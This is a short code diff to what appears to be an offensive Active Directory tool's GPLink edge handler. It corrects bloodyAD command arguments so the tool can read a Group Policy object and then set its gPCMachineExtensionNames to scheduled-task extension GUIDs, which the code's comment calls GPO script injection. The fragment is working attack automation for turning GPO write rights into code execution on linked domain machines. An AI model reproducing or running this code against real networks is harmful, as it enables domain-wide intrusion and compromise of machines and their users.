@@ -170,7 +170,7 @@ class GPLinkHandler(BaseEdgeHandler):
         )
         if gpo_dn:
             read_result = await bloody.run_bloodyad(
-                ["get", "object", gpo_dn, "--attr", "gPCFileSysPath", "--attr", "versionNumber"],
+                ["get", "object", gpo_dn, "--attr", "gPCFileSysPath,versionNumber"],
                 self.config,
                 auth_args=auth_args,
             )
@@ -190,13 +190,15 @@ class GPLinkHandler(BaseEdgeHandler):
         # The exact command depends on bloodyAD version; we use the
         # generic set approach for GPO script injection.
         gpo_target = gpo_dn or gpo_name
+        extension_value = (
+            "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
+            "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
+        )
         modify_result = await bloody.run_bloodyad(
             [
                 "set", "object", gpo_target,
-                "--attr", "gPCMachineExtensionNames",
-                "--value",
-                "[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]"
-                "[{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]",
+                "gPCMachineExtensionNames",
+                "-v", extension_value,
             ],
             self.config,
             auth_args=auth_args,
